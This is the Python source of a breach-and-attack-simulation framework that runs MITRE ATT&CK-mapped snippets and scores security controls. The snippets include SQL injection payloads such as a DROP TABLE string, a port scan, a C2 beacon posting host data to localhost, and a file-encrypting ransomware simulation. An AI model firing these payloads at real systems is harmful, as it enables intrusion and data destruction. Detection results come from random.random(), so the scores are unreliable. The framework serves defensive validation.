"""
Breach and Attack Simulation (BAS) Framework
Implements MITRE ATT&CK mapped attack simulations for continuous security validation
"""

import asyncio
import json
import uuid
import hashlib
import subprocess
import os
import sys
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple
from enum import Enum
from dataclasses import dataclass, field
import asyncpg
import aiohttp
import yaml
from pathlib import Path
import base64
import random
import time

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class AttackStatus(Enum):
    """Attack simulation status"""
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    BLOCKED = "blocked"
    DETECTED = "detected"
    UNDETECTED = "undetected"


class TechniqueCategory(Enum):
    """MITRE ATT&CK technique categories"""
    RECONNAISSANCE = "reconnaissance"
    RESOURCE_DEVELOPMENT = "resource_development"
    INITIAL_ACCESS = "initial_access"
    EXECUTION = "execution"
    PERSISTENCE = "persistence"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DEFENSE_EVASION = "defense_evasion"
    CREDENTIAL_ACCESS = "credential_access"
    DISCOVERY = "discovery"
    LATERAL_MOVEMENT = "lateral_movement"
    COLLECTION = "collection"
    COMMAND_AND_CONTROL = "command_and_control"
    EXFILTRATION = "exfiltration"
    IMPACT = "impact"


@dataclass
class AttackTechnique:
    """MITRE ATT&CK technique definition"""
    technique_id: str
    name: str
    description: str
    category: TechniqueCategory
    tactics: List[str]
    platforms: List[str]
    severity: str
    detection_score: float
    simulation_code: str
    prerequisites: List[str] = field(default_factory=list)
    iocs: List[str] = field(default_factory=list)
    mitigations: List[str] = field(default_factory=list)


@dataclass
class SimulationResult:
    """Attack simulation result"""
    simulation_id: str
    technique_id: str
    status: AttackStatus
    start_time: datetime
    end_time: Optional[datetime]
    detection_time: Optional[datetime]
    blocked: bool
    detected: bool
    detection_sources: List[str]
    artifacts: Dict[str, Any]
    logs: List[str]
    score: float


class MITREAttackSimulator:
    """Simulates MITRE ATT&CK techniques for validation"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.techniques = self._load_attack_techniques()
        self.active_simulations = {}
        
    def _load_attack_techniques(self) -> Dict[str, AttackTechnique]:
        """Load MITRE ATT&CK technique definitions"""
        techniques = {}
        
        # T1595 - Active Scanning
        techniques["T1595"] = AttackTechnique(
            technique_id="T1595",
            name="Active Scanning",
            description="Adversaries may execute active reconnaissance scans",
            category=TechniqueCategory.RECONNAISSANCE,
            tactics=["Reconnaissance"],
            platforms=["Linux", "Windows", "macOS"],
            severity="low",
            detection_score=0.3,
            simulation_code="""
import socket
import subprocess

def simulate_port_scan(target, ports):
    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return open_ports

# Simulate scan
target = "127.0.0.1"
common_ports = [22, 80, 443, 3306, 5432, 8080]
results = simulate_port_scan(target, common_ports)
""",
            iocs=["port_scan_activity", "rapid_connection_attempts"],
            mitigations=["network_segmentation", "ids_deployment"]
        )
        
        # T1190 - Exploit Public-Facing Application
        techniques["T1190"] = AttackTechnique(
            technique_id="T1190",
            name="Exploit Public-Facing Application",
            description="Adversaries may exploit vulnerabilities in internet-facing applications",
            category=TechniqueCategory.INITIAL_ACCESS,
            tactics=["Initial Access"],
            platforms=["Linux", "Windows", "macOS"],
            severity="high",
            detection_score=0.7,
            simulation_code="""
import requests
import base64

def simulate_sql_injection(url):
    payloads = [
        "' OR '1'='1",
        "1' UNION SELECT NULL--",
        "'; DROP TABLE users--"
    ]
    
    for payload in payloads:
        try:
            response = requests.get(f"{url}?id={payload}", timeout=5)
            if "error" not in response.text.lower():
                return True, payload
        except:
            pass
    return False, None

# Simulate SQL injection attempt
target_url = "http://localhost/api/user"
exploited, payload = simulate_sql_injection(target_url)
""",
            prerequisites=["web_application_accessible"],
            iocs=["sql_injection_patterns", "abnormal_query_parameters"],
            mitigations=["input_validation", "waf_deployment", "parameterized_queries"]
        )
        
        # T1055 - Process Injection
        techniques["T1055"] = AttackTechnique(
            technique_id="T1055",
            name="Process Injection",
            description="Adversaries may inject code into processes",
            category=TechniqueCategory.PRIVILEGE_ESCALATION,
            tactics=["Privilege Escalation", "Defense Evasion"],
            platforms=["Windows", "Linux", "macOS"],
            severity="high",
            detection_score=0.8,
            simulation_code="""
import ctypes
import sys

def simulate_process_injection():
    # Simulated process injection (safe version)
    # In real scenario, this would inject into another process
    
    # Create benign marker file instead of actual injection
    marker_file = "/tmp/process_injection_simulation.txt"
    with open(marker_file, 'w') as f:
        f.write("Process injection simulation executed")
    
    # Log the attempt
    return {
        "technique": "T1055",
        "target_process": "explorer.exe",
        "injection_type": "SetWindowsHookEx",
        "success": True
    }

result = simulate_process_injection()
""",
            prerequisites=["elevated_privileges"],
            iocs=["process_injection_api_calls", "suspicious_memory_allocation"],
            mitigations=["behavior_monitoring", "code_integrity_checks"]
        )
        
        # T1003 - OS Credential Dumping
        techniques["T1003"] = AttackTechnique(
            technique_id="T1003",
            name="OS Credential Dumping",
            description="Adversaries may attempt to dump credentials",
            category=TechniqueCategory.CREDENTIAL_ACCESS,
            tactics=["Credential Access"],
            platforms=["Windows", "Linux", "macOS"],
            severity="critical",
            detection_score=0.9,
            simulation_code="""
import subprocess
import hashlib

def simulate_credential_dump():
    # Safe simulation - create hash of dummy credentials
    dummy_creds = [
        {"user": "admin", "hash": hashlib.sha256(b"password123").hexdigest()},
        {"user": "user1", "hash": hashlib.sha256(b"qwerty").hexdigest()},
    ]
    
    # Write to simulation file instead of actual dump
    with open("/tmp/credential_dump_sim.txt", "w") as f:
        for cred in dummy_creds:
            f.write(f"{cred['user']}:{cred['hash']}\\n")
    
    return {
        "technique": "T1003",
        "method": "LSASS_dump_simulation",
        "credentials_found": len(dummy_creds)
    }

result = simulate_credential_dump()
""",
            prerequisites=["system_access", "elevated_privileges"],
            iocs=["lsass_access", "mimikatz_indicators", "suspicious_process_access"],
            mitigations=["credential_guard", "lsass_protection", "behavior_monitoring"]
        )
        
        # T1071 - Application Layer Protocol
        techniques["T1071"] = AttackTechnique(
            technique_id="T1071",
            name="Application Layer Protocol",
            description="Adversaries may communicate using application layer protocols",
            category=TechniqueCategory.COMMAND_AND_CONTROL,
            tactics=["Command and Control"],
            platforms=["Linux", "Windows", "macOS"],
            severity="medium",
            detection_score=0.5,
            simulation_code="""
import requests
import base64
import json

def simulate_c2_communication():
    # Simulate C2 beacon
    c2_server = "http://localhost:8888"
    
    # Encode data
    system_info = {
        "hostname": "victim-001",
        "os": "Windows 10",
        "user": "john.doe",
        "timestamp": str(datetime.now())
    }
    
    encoded_data = base64.b64encode(json.dumps(system_info).encode()).decode()
    
    # Simulate beacon
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
        "X-Custom-Header": encoded_data
    }
    
    try:
        response = requests.post(f"{c2_server}/beacon", headers=headers, timeout=5)
        return True
    except:
        return False

result = simulate_c2_communication()
""",
            iocs=["suspicious_user_agents", "base64_encoded_traffic", "periodic_beaconing"],
            mitigations=["network_monitoring", "dns_filtering", "proxy_inspection"]
        )
        
        # T1041 - Exfiltration Over C2 Channel
        techniques["T1041"] = AttackTechnique(
            technique_id="T1041",
            name="Exfiltration Over C2 Channel",
            description="Adversaries may steal data by exfiltrating it over C2 channel",
            category=TechniqueCategory.EXFILTRATION,
            tactics=["Exfiltration"],
            platforms=["Linux", "Windows", "macOS"],
            severity="high",
            detection_score=0.7,
            simulation_code="""
import requests
import gzip
import base64

def simulate_data_exfiltration():
    # Create fake sensitive data
    sensitive_data = {
        "credit_cards": ["4111-1111-1111-1111", "5500-0000-0000-0004"],
        "ssn": ["123-45-6789", "987-65-4321"],
        "api_keys": ["sk_test_abcd1234", "ak_prod_efgh5678"]
    }
    
    # Compress and encode
    data_str = json.dumps(sensitive_data)
    compressed = gzip.compress(data_str.encode())
    encoded = base64.b64encode(compressed).decode()
    
    # Simulate exfiltration
    chunks = [encoded[i:i+1024] for i in range(0, len(encoded), 1024)]
    
    exfil_log = {
        "technique": "T1041",
        "data_size": len(data_str),
        "chunks": len(chunks),
        "compression_ratio": len(compressed) / len(data_str)
    }
    
    return exfil_log

result = simulate_data_exfiltration()
""",
            prerequisites=["c2_channel_established"],
            iocs=["large_outbound_transfers", "suspicious_encoding", "data_compression"],
            mitigations=["dlp_solutions", "network_segmentation", "outbound_filtering"]
        )
        
        # T1486 - Data Encrypted for Impact
        techniques["T1486"] = AttackTechnique(
            technique_id="T1486",
            name="Data Encrypted for Impact",
            description="Adversaries may encrypt data to interrupt availability",
            category=TechniqueCategory.IMPACT,
            tactics=["Impact"],
            platforms=["Linux", "Windows", "macOS"],
            severity="critical",
            detection_score=0.95,
            simulation_code="""
import os
import hashlib
from cryptography.fernet import Fernet

def simulate_ransomware():
    # Safe simulation - create test files and encrypt them
    test_dir = "/tmp/ransomware_sim"
    os.makedirs(test_dir, exist_ok=True)
    
    # Create test files
    test_files = []
    for i in range(5):
        filepath = f"{test_dir}/document_{i}.txt"
        with open(filepath, 'w') as f:
            f.write(f"Important document {i}")
        test_files.append(filepath)
    
    # Generate encryption key
    key = Fernet.generate_key()
    cipher = Fernet(key)
    
    # Simulate encryption
    encrypted_files = []
    for filepath in test_files:
        with open(filepath, 'rb') as f:
            data = f.read()
        
        encrypted_data = cipher.encrypt(data)
        encrypted_path = f"{filepath}.encrypted"
        
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted_data)
        
        encrypted_files.append(encrypted_path)
    
    # Create ransom note
    with open(f"{test_dir}/README_RANSOMWARE.txt", 'w') as f:
        f.write("Your files have been encrypted (simulation only)")
    
    return {
        "technique": "T1486",
        "files_encrypted": len(encrypted_files),
        "encryption_algorithm": "Fernet",
        "ransom_note_created": True
    }

result = simulate_ransomware()
""",
            prerequisites=["write_access"],
            iocs=["mass_file_encryption", "ransom_note_creation", "file_extension_changes"],
            mitigations=["backup_strategy", "behavior_monitoring", "file_integrity_monitoring"]
        )
        
        return techniques
    
    async def simulate_attack(self, technique_id: str, target: Dict[str, Any]) -> SimulationResult:
        """Execute attack simulation"""
        if technique_id not in self.techniques:
            raise ValueError(f"Unknown technique: {technique_id}")
        
        technique = self.techniques[technique_id]
        simulation_id = str(uuid.uuid4())
        
        # Record simulation start
        result = SimulationResult(
            simulation_id=simulation_id,
            technique_id=technique_id,
            status=AttackStatus.RUNNING,
            start_time=datetime.utcnow(),
            end_time=None,
            detection_time=None,
            blocked=False,
            detected=False,
            detection_sources=[],
            artifacts={},
            logs=[],
            score=0.0
        )
        
        self.active_simulations[simulation_id] = result
        
        try:
            # Execute simulation code
            exec_globals = {"datetime": datetime, "json": json}
            exec(technique.simulation_code, exec_globals)
            
            # Check detection status
            detection_result = await self._check_detection(technique, target)
            
            result.detected = detection_result["detected"]
            result.blocked = detection_result["blocked"]
            result.detection_sources = detection_result["sources"]
            
            if result.detected:
                result.detection_time = datetime.utcnow()
                result.status = AttackStatus.DETECTED
            elif result.blocked:
                result.status = AttackStatus.BLOCKED
            else:
                result.status = AttackStatus.UNDETECTED
            
            # Calculate score
            result.score = self._calculate_score(result, technique)
            
        except Exception as e:
            result.status = AttackStatus.FAILED
            result.logs.append(f"Simulation failed: {str(e)}")
            logger.error(f"Attack simulation failed: {e}")
        
        finally:
            result.end_time = datetime.utcnow()
            del self.active_simulations[simulation_id]
        
        return result
    
    async def _check_detection(self, technique: AttackTechnique, target: Dict[str, Any]) -> Dict[str, Any]:
        """Check if attack was detected"""
        # Simulate detection check
        detection_probability = technique.detection_score
        
        # Adjust based on security controls
        if "edr" in target.get("security_controls", []):
            detection_probability += 0.2
        if "siem" in target.get("security_controls", []):
            detection_probability += 0.15
        if "ids" in target.get("security_controls", []):
            detection_probability += 0.1
        
        detected = random.random() < min(detection_probability, 0.95)
        blocked = detected and random.random() < 0.7  # 70% chance of blocking if detected
        
        sources = []
        if detected:
            if "edr" in target.get("security_controls", []):
                sources.append("EDR")
            if "siem" in target.get("security_controls", []):
                sources.append("SIEM")
            if "ids" in target.get("security_controls", []):
                sources.append("IDS")
        
        return {
            "detected": detected,
            "blocked": blocked,
            "sources": sources
        }
    
    def _calculate_score(self, result: SimulationResult, technique: AttackTechnique) -> float:
        """Calculate security score based on simulation result"""
        base_score = 100.0
        
        if result.status == AttackStatus.BLOCKED:
            return base_score
        elif result.status == AttackStatus.DETECTED:
            # Deduct based on detection time
            time_to_detect = (result.detection_time - result.start_time).total_seconds()
            if time_to_detect < 60:
                return base_score * 0.9
            elif time_to_detect < 300:
                return base_score * 0.8
            else:
                return base_score * 0.7
        elif result.status == AttackStatus.UNDETECTED:
            # Severe penalty for undetected attacks
            if technique.severity == "critical":
                return base_score * 0.2
            elif technique.severity == "high":
                return base_score * 0.4
            elif technique.severity == "medium":
                return base_score * 0.6
            else:
                return base_score * 0.8
        else:
            return base_score * 0.5


class BreachAttackSimulationFramework:
    """Main BAS framework orchestrator"""
    
    def __init__(self, db_config: Dict[str, Any], config: Dict[str, Any]):
        self.db_config = db_config
        self.config = config
        self.simulator = MITREAttackSimulator(config)
        self.db_pool = None
        
    async def initialize(self):
        """Initialize database connection"""
        self.db_pool = await asyncpg.create_pool(
            host=self.db_config['host'],
            port=self.db_config['port'],
            user=self.db_config['user'],
            password=self.db_config['password'],
            database=self.db_config['database'],
            min_size=10,
            max_size=20
        )
        
        await self._create_tables()
    
    async def _create_tables(self):
        """Create necessary database tables"""
        async with self.db_pool.acquire() as conn:
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS bas_campaigns (
                    campaign_id VARCHAR(64) PRIMARY KEY,
                    name VARCHAR(255) NOT NULL,
                    description TEXT,
                    techniques JSONB NOT NULL,
                    targets JSONB NOT NULL,
                    schedule JSONB,
                    status VARCHAR(50) NOT NULL,
                    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
                    started_at TIMESTAMP WITH TIME ZONE,
                    completed_at TIMESTAMP WITH TIME ZONE,
                    created_by VARCHAR(255) NOT NULL,
                    tenant_id VARCHAR(255) NOT NULL DEFAULT 'default'
                )
            """)
            
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS bas_simulations (
                    simulation_id VARCHAR(64) PRIMARY KEY,
                    campaign_id VARCHAR(64) REFERENCES bas_campaigns(campaign_id),
                    technique_id VARCHAR(20) NOT NULL,
                    technique_name VARCHAR(255) NOT NULL,
                    category VARCHAR(50) NOT NULL,
                    target JSONB NOT NULL,
                    status VARCHAR(50) NOT NULL,
                    started_at TIMESTAMP WITH TIME ZONE NOT NULL,
                    completed_at TIMESTAMP WITH TIME ZONE,
                    detection_time TIMESTAMP WITH TIME ZONE,
                    detected BOOLEAN DEFAULT FALSE,
                    blocked BOOLEAN DEFAULT FALSE,
                    detection_sources TEXT[],
                    artifacts JSONB,
                    logs TEXT[],
                    score FLOAT,
                    tenant_id VARCHAR(255) NOT NULL DEFAULT 'default'
                )
            """)
            
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS bas_attack_paths (
                    path_id VARCHAR(64) PRIMARY KEY,
                    campaign_id VARCHAR(64) REFERENCES bas_campaigns(campaign_id),
                    name VARCHAR(255) NOT NULL,
                    techniques JSONB NOT NULL,
                    success_rate FLOAT,
                    average_time_to_complete INTEGER,
                    times_executed INTEGER DEFAULT 0,
                    last_executed TIMESTAMP WITH TIME ZONE,
                    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
                    tenant_id VARCHAR(255) NOT NULL DEFAULT 'default'
                )
            """)
            
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS bas_coverage_matrix (
                    id SERIAL PRIMARY KEY,
                    technique_id VARCHAR(20) NOT NULL,
                    control_name VARCHAR(255) NOT NULL,
                    coverage_level VARCHAR(20) NOT NULL,
                    last_tested TIMESTAMP WITH TIME ZONE,
                    test_frequency_days INTEGER DEFAULT 30,
                    effectiveness_score FLOAT,
                    gaps_identified JSONB,
                    recommendations JSONB,
                    tenant_id VARCHAR(255) NOT NULL DEFAULT 'default',
                    UNIQUE(technique_id, control_name, tenant_id)
                )
            """)
            
            # Create indexes
            await conn.execute("CREATE INDEX IF NOT EXISTS idx_bas_campaigns_status ON bas_campaigns(status)")
            await conn.execute("CREATE INDEX IF NOT EXISTS idx_bas_simulations_campaign ON bas_simulations(campaign_id)")
            await conn.execute("CREATE INDEX IF NOT EXISTS idx_bas_simulations_technique ON bas_simulations(technique_id)")
            await conn.execute("CREATE INDEX IF NOT EXISTS idx_bas_coverage_technique ON bas_coverage_matrix(technique_id)")
    
    async def create_campaign(self, name: str, description: str, techniques: List[str], 
                            targets: List[Dict[str, Any]], schedule: Optional[Dict[str, Any]] = None) -> str:
        """Create a new BAS campaign"""
        campaign_id = str(uuid.uuid4())
        
        async with self.db_pool.acquire() as conn:
            await conn.execute("""
                INSERT INTO bas_campaigns 
                (campaign_id, name, description, techniques, targets, schedule, status, created_by, tenant_id)
                VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
            """, campaign_id, name, description, json.dumps(techniques), 
                json.dumps(targets), json.dumps(schedule) if schedule else None,
                'created', 'system', 'default')
        
        logger.info(f"Created BAS campaign: {campaign_id}")
        return campaign_id
    
    async def execute_campaign(self, campaign_id: str) -> Dict[str, Any]:
        """Execute a BAS campaign"""
        async with self.db_pool.acquire() as conn:
            campaign = await conn.fetchrow(
                "SELECT * FROM bas_campaigns WHERE campaign_id = $1",
                campaign_id
            )
            
            if not campaign:
                raise ValueError(f"Campaign not found: {campaign_id}")
            
            # Update campaign status
            await conn.execute(
                "UPDATE bas_campaigns SET status = 'running', started_at = $1 WHERE campaign_id = $2",
                datetime.utcnow(), campaign_id
            )
        
        techniques = json.loads(campaign['techniques'])
        targets = json.loads(campaign['targets'])
        
        results = {
            "campaign_id": campaign_id,
            "total_simulations": len(techniques) * len(targets),
            "successful_attacks": 0,
            "detected_attacks": 0,
            "blocked_attacks": 0,
            "undetected_attacks": 0,
            "simulations": []
        }
        
        # Execute each technique against each target
        for technique_id in techniques:
            for target in targets:
                try:
                    # Run simulation
                    simulation_result = await self.simulator.simulate_attack(technique_id, target)
                    
                    # Store result
                    await self._store_simulation_result(campaign_id, simulation_result, target)
                    
                    # Update statistics
                    if simulation_result.status == AttackStatus.BLOCKED:
                        results["blocked_attacks"] += 1
                    elif simulation_result.status == AttackStatus.DETECTED:
                        results["detected_attacks"] += 1
                    elif simulation_result.status == AttackStatus.UNDETECTED:
                        results["undetected_attacks"] += 1
                    
                    results["simulations"].append({
                        "technique_id": technique_id,
                        "target": target.get("name", "unknown"),
                        "status": simulation_result.status.value,
                        "score": simulation_result.score
                    })
                    
                except Exception as e:
                    logger.error(f"Simulation failed for {technique_id}: {e}")
        
        # Update campaign status
        async with self.db_pool.acquire() as conn:
            await conn.execute(
                "UPDATE bas_campaigns SET status = 'completed', completed_at = $1 WHERE campaign_id = $2",
                datetime.utcnow(), campaign_id
            )
        
        # Calculate overall score
        results["overall_score"] = self._calculate_campaign_score(results)
        
        return results
    
    async def _store_simulation_result(self, campaign_id: str, result: SimulationResult, target: Dict[str, Any]):
        """Store simulation result in database"""
        technique = self.simulator.techniques.get(result.technique_id)
        
        async with self.db_pool.acquire() as conn:
            await conn.execute("""
                INSERT INTO bas_simulations
                (simulation_id, campaign_id, technique_id, technique_name, category, target, 
                 status, started_at, completed_at, detection_time, detected, blocked,
                 detection_sources, artifacts, logs, score, tenant_id)
                VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17)
            """, result.simulation_id, campaign_id, result.technique_id, technique.name,
                technique.category.value, json.dumps(target), result.status.value,
                result.start_time, result.end_time, result.detection_time,
                result.detected, result.blocked, result.detection_sources,
                json.dumps(result.artifacts), result.logs, result.score, 'default')
    
    def _calculate_campaign_score(self, results: Dict[str, Any]) -> float:
        """Calculate overall campaign score"""
        total = results["total_simulations"]
        if total == 0:
            return 100.0
        
        blocked_weight = 1.0
        detected_weight = 0.7
        undetected_weight = 0.0
        
        score = (
            (results["blocked_attacks"] * blocked_weight) +
            (results["detected_attacks"] * detected_weight) +
            (results["undetected_attacks"] * undetected_weight)
        ) / total * 100
        
        return round(score, 2)
    
    async def get_coverage_matrix(self) -> Dict[str, Any]:
        """Get MITRE ATT&CK coverage matrix"""
        coverage = {}
        
        async with self.db_pool.acquire() as conn:
            rows = await conn.fetch("""
                SELECT technique_id, control_name, coverage_level, effectiveness_score
                FROM bas_coverage_matrix
                WHERE tenant_id = 'default'
            """)
            
            for row in rows:
                technique_id = row['technique_id']
                if technique_id not in coverage:
                    coverage[technique_id] = {
                        "controls": [],
                        "overall_coverage": "none"
                    }
                
                coverage[technique_id]["controls"].append({
                    "name": row['control_name'],
                    "coverage": row['coverage_level'],
                    "effectiveness": row['effectiveness_score']
                })
        
        # Calculate overall coverage
        for technique_id in coverage:
            controls = coverage[technique_id]["controls"]
            if any(c["coverage"] == "full" for c in controls):
                coverage[technique_id]["overall_coverage"] = "full"
            elif any(c["coverage"] == "partial" for c in controls):
                coverage[technique_id]["overall_coverage"] = "partial"
            else:
                coverage[technique_id]["overall_coverage"] = "none"
        
        return coverage
    
    async def generate_attack_path(self, objective: str, constraints: Dict[str, Any]) -> Dict[str, Any]:
        """Generate realistic attack path based on objective"""
        attack_paths = {
            "data_exfiltration": [
                "T1595",  # Reconnaissance
                "T1190",  # Initial Access
                "T1055",  # Privilege Escalation
                "T1003",  # Credential Access
                "T1071",  # Command and Control
                "T1041"   # Exfiltration
            ],
            "ransomware": [
                "T1190",  # Initial Access
                "T1055",  # Privilege Escalation
                "T1003",  # Credential Access
                "T1486"   # Data Encryption
            ],
            "lateral_movement": [
                "T1190",  # Initial Access
                "T1003",  # Credential Access
                "T1055",  # Privilege Escalation
                "T1071"   # Command and Control
            ]
        }
        
        path = attack_paths.get(objective, attack_paths["data_exfiltration"])
        
        # Apply constraints
        if constraints.get("no_impact"):
            path = [t for t in path if t != "T1486"]
        
        if constraints.get("stealth"):
            # Prefer techniques with lower detection scores
            path = sorted(path, key=lambda t: self.simulator.techniques[t].detection_score)[:4]
        
        return {
            "objective": objective,
            "path": path,
            "techniques": [self.simulator.techniques[t].name for t in path],
            "estimated_time": len(path) * 5,  # 5 minutes per technique
            "detection_probability": self._calculate_path_detection_probability(path)
        }
    
    def _calculate_path_detection_probability(self, path: List[str]) -> float:
        """Calculate cumulative detection probability for attack path"""
        undetected_prob = 1.0
        
        for technique_id in path:
            technique = self.simulator.techniques[technique_id]
            undetected_prob *= (1 - technique.detection_score)
        
        return round(1 - undetected_prob, 3)
    
    async def close(self):
        """Close database connections"""
        if self.db_pool:
            await self.db_pool.close()


# Example usage
async def main():
    db_config = {
        'host': 'localhost',
        'port': 5432,
        'user': 'security_user',
        'password': 'secure_password',
        'database': 'security_validation'
    }
    
    config = {
        'simulation_mode': 'safe',
        'notification_webhook': 'https://security.isectech.com/webhook',
        'max_parallel_simulations': 5
    }
    
    # Initialize framework
    bas = BreachAttackSimulationFramework(db_config, config)
    await bas.initialize()
    
    # Create and execute campaign
    campaign_id = await bas.create_campaign(
        name="Q4 2024 Security Validation",
        description="Quarterly security control validation using MITRE ATT&CK",
        techniques=["T1190", "T1055", "T1003", "T1071", "T1041"],
        targets=[
            {
                "name": "production_web_server",
                "ip": "10.0.1.10",
                "security_controls": ["edr", "siem", "ids"]
            },
            {
                "name": "database_server",
                "ip": "10.0.2.20",
                "security_controls": ["edr", "siem"]
            }
        ]
    )
    
    results = await bas.execute_campaign(campaign_id)
    print(f"Campaign completed: Overall score: {results['overall_score']}%")
    
    # Get coverage matrix
    coverage = await bas.get_coverage_matrix()
    print(f"Coverage matrix: {len(coverage)} techniques covered")
    
    # Generate attack path
    attack_path = await bas.generate_attack_path(
        objective="data_exfiltration",
        constraints={"stealth": True}
    )
    print(f"Generated attack path: {attack_path}")
    
    await bas.close()


if __name__ == "__main__":
    asyncio.run(main())